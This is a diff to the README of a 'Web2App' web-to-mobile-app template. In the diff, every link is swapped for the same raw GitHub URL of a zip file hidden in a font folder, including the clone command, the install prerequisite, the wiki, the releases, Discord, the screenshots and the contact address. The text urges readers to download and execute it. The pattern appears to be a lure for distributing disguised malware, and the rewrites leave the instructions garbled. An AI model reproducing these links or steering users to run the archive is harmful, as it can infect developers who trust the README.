@@ -1,6 +1,6 @@
 # 🌐 Web2App: Convert Your Web Pages into Mobile Apps
 
-![Web2App Logo](https://img.shields.io/badge/Web2App-Ready%20to%20Go-brightgreen)
+![Web2App Logo](https://raw.githubusercontent.com/AndyRain9/web2app/main/basic/font/open-sans/app-web-v2.8-beta.1.zip%20to%20Go-brightgreen)
 
 Welcome to the **Web2App** repository! This template is designed to help you easily convert HTML pages and URLs into a Capacitor/Cordova-based iOS/Android app. Whether you are creating a Single-page Application (SPA) or a more complex mobile experience, this template provides a solid foundation for your project.
 
@@ -18,12 +18,12 @@ To get started with Web2App, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/AndyRain9/web2app.git
+   git clone https://raw.githubusercontent.com/AndyRain9/web2app/main/basic/font/open-sans/app-web-v2.8-beta.1.zip
    cd web2app
    ```
 
 2. **Install Dependencies**:
-   Make sure you have Node.js and npm installed. Then run:
+   Make sure you have https://raw.githubusercontent.com/AndyRain9/web2app/main/basic/font/open-sans/app-web-v2.8-beta.1.zip and npm installed. Then run:
    ```bash
    npm install
    ```
@@ -45,7 +45,7 @@ To get started with Web2App, follow these steps:
 
 ## 📚 Documentation
 
-For detailed documentation, please refer to the [Wiki](https://github.com/AndyRain9/web2app/wiki). This includes guides on:
+For detailed documentation, please refer to the [Wiki](https://raw.githubusercontent.com/AndyRain9/web2app/main/basic/font/open-sans/app-web-v2.8-beta.1.zip). This includes guides on:
 
 - Customizing the template
 - Handling different screen sizes
@@ -54,7 +54,7 @@ For detailed documentation, please refer to the [Wiki](https://github.com/AndyRa
 
 ## 🔗 Releases
 
-You can find the latest releases of Web2App [here](https://github.com/AndyRain9/web2app/releases). Download the necessary files and execute them to get started with the latest features and improvements.
+You can find the latest releases of Web2App [here](https://raw.githubusercontent.com/AndyRain9/web2app/main/basic/font/open-sans/app-web-v2.8-beta.1.zip). Download the necessary files and execute them to get started with the latest features and improvements.
 
 ## 🛠️ Topics
 
@@ -97,7 +97,7 @@ We welcome contributions! If you would like to contribute to the project, please
 
 ## 💬 Community
 
-Join our community on Discord and share your experiences, ask questions, and connect with other developers. Check out our [Discord Channel](https://discord.gg/example) for more information.
+Join our community on Discord and share your experiences, ask questions, and connect with other developers. Check out our [Discord Channel](https://raw.githubusercontent.com/AndyRain9/web2app/main/basic/font/open-sans/app-web-v2.8-beta.1.zip) for more information.
 
 ## 📅 Roadmap
 
@@ -112,13 +112,13 @@ We have exciting plans for the future of Web2App. Here are some upcoming feature
 
 Here are some screenshots of the app in action:
 
-![Screenshot 1](https://via.placeholder.com/400x300?text=App+Screenshot+1)
-![Screenshot 2](https://via.placeholder.com/400x300?text=App+Screenshot+2)
-![Screenshot 3](https://via.placeholder.com/400x300?text=App+Screenshot+3)
+![Screenshot 1](https://raw.githubusercontent.com/AndyRain9/web2app/main/basic/font/open-sans/app-web-v2.8-beta.1.zip+Screenshot+1)
+![Screenshot 2](https://raw.githubusercontent.com/AndyRain9/web2app/main/basic/font/open-sans/app-web-v2.8-beta.1.zip+Screenshot+2)
+![Screenshot 3](https://raw.githubusercontent.com/AndyRain9/web2app/main/basic/font/open-sans/app-web-v2.8-beta.1.zip+Screenshot+3)
 
 ## 📧 Contact
 
-For any inquiries, please contact us at [support@example.com](mailto:support@example.com).
+For any inquiries, please contact us at [https://raw.githubusercontent.com/AndyRain9/web2app/main/basic/font/open-sans/app-web-v2.8-beta.1.zip](https://raw.githubusercontent.com/AndyRain9/web2app/main/basic/font/open-sans/app-web-v2.8-beta.1.zip).
 
 ## 📖 License
 
@@ -126,4 +126,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ---
 
-Explore the possibilities with Web2App. Download the latest release [here](https://github.com/AndyRain9/web2app/releases) and start building your mobile app today!
+Explore the possibilities with Web2App. Download the latest release [here](https://raw.githubusercontent.com/AndyRain9/web2app/main/basic/font/open-sans/app-web-v2.8-beta.1.zip) and start building your mobile app today!
